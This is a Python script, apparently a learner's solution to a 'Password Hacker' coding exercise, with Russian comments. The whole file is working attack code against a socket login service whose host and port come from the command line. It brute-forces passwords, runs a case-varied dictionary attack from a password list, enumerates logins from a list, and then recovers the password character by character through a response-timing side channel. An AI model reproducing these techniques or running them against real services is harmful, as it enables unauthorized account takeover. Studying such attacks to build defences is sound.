import sys
import socket
from itertools import product
from json import dumps, loads
from time import perf_counter


def passwd_gen(n) -> tuple:
    """брутфорс паролей разной длины"""
    symbols = 'abcdefghijklmnopqrstuvwxyz0123456789'
    yield from product(symbols, repeat=n)


def main_1():
    with socket.socket() as client:
        addr = (sys.argv[1], int(sys.argv[2]))
        client.connect(addr)
        pass_len = 1

        while True:
            for passwd in passwd_gen(pass_len):
                msg = ''.join(passwd)
                client.send(msg.encode())
                response = client.recv(1024)
                if response.decode() == 'Connection success!':
                    print(msg)
                    exit()
            pass_len += 1


def passwd_gen_v2(password_on_line) -> str:
    """UpperLowerCase для самых используемых паролей"""
    if not password_on_line.isdigit():
        for var in product(*([letter.lower(), letter.upper()] for letter in password_on_line)):
            yield ''.join(var)
    else:
        yield password_on_line


def main_2():
    args = sys.argv
    addr = (args[1], int(args[2]))

    with socket.socket() as client, open('C:\\Users\\Viroa Rea\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\passwords.txt', 'r') as file:
        client.connect(addr)
        success = False

        while not success:
            for word in file:
                for passwd in passwd_gen_v2(word.strip("\n")):
                    client.send(passwd.encode())
                    response = client.recv(1024)
                    if response.decode() == 'Connection success!':
                        print(passwd)
                        success = True
                        exit()


def time_counter(body, client_):
    time_start = perf_counter()
    client_.send(dumps(body).encode())
    response = client_.recv(1024)
    time_end = perf_counter() - time_start
    return response, time_end


if __name__ == '__main__':
    args = sys.argv
    addr = (args[1], int(args[2]))
    path_login = 'C:\\Users\\Viroa Rea\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\logins.txt'
    # path_login = '../logins.txt'
    symbols = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    # symbols = 'abcdefghijklmnopqrstuvwxyz1234567890'

    with socket.socket() as client, open(path_login, 'r') as f_login:
        client.connect(addr)
        success = False
        request_body = {"login": None, "password": " "}

        # поиск верного логина из списка
        for word in f_login:
            request_body['login'] = word.strip("\n")
            client.send(dumps(request_body).encode())
            response = client.recv(1024)
            if loads(response.decode())['result'] == 'Wrong password!':
                break

        password = ''
        # получение времени ответа на неверный пароль
        _, key_time = time_counter(request_body, client)

        # подбор пароля
        while True:
            for item in symbols:
                request_body['password'] = password + item
                response, time_end = time_counter(request_body, client)
                # если задержка, то была обработка exception и найден верный символ
                if time_end - key_time > 0.1:
                    password += item
                    break
                elif loads(response.decode())['result'] == 'Connection success!':
                    print(dumps(request_body))
                    exit()
